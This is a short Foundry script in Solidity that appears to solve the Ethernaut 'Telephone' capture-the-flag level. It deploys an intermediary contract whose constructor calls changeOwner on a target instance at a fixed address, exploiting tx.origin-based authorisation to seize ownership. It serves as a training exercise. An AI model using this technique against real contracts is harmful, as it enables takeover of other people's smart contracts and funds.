// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermetiateContract {
    constructor(Telephone _level5, address _newOwner) {
        _level5.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {
    Telephone public level5 =
        Telephone(0xD4f793357672EE0c9fF2d69822c49191fd50C805);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new IntermetiateContract(level5, vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}
